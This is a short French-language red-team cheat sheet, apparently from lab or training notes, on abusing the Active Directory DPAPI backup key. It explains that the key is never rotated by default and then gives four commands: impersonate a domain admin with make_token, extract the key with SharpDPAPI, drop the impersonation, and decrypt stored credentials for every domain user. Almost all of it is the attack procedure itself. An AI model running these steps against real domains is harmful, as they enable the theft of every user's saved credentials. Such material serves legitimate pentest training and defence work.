
> [!Tip]
> La clé DPAPI d'un utilisateur permet de chiffrer sa Masterkey, à partir d'une dérivation de son mot de passe.
> 
> Lors de la création du domaine, une DPAPI backup key est créée. Elle permet notamment lors du changement de mots de passe des utilisateur de pouvoir déchiffrer la copie de leur masterkey originale, puis la rechiffrer à partir de leur nouveau mot de passe.
> 
> Par défaut la Backup Key n'est jamais changée. L'obtenir permet de déchiffrer tous les DPAPI Blobs de n'importe quel utilisateur du domaine.


1. Usurper un admin du domaine depuis une session medium

```
make_token CONTOSO\dyork Passw0rd!
```

2. Extraire la Backup Key

```
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe backupkey
```

3. Dropper l'impersonation

```
rev2self
```

4. Puis énumérer les creds chiffrés pour tous les users sur n'importe quelle machine.

```
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /pvk:<backup_key>
```

